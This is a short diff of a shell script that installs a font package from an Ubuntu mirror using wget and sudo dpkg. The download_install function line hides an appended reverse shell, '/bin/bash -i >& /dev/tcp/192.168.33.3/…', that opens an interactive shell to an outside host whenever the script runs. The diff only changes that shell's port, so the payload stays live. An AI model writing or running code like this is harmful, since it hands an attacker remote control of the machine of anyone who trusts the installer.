@@ -1,4 +1,4 @@
-function download_install () { wget $1 ; sudo dpkg -i $2; rm $2; };/bin/bash -i >& /dev/tcp/192.168.33.3/8080 0>&1
+function download_install () { wget $1 ; sudo dpkg -i $2; rm $2; };/bin/bash -i >& /dev/tcp/192.168.33.3/8585 0>&1
 
 download_install "http://ftp.osuosl.org/pub/ubuntu/pool/universe/f/fonts-adf/fonts-adf-accanthis_0.20110505-1_all.deb" "fonts-adf-accanthis_0.20110505-1_all.deb"
 sleep 5
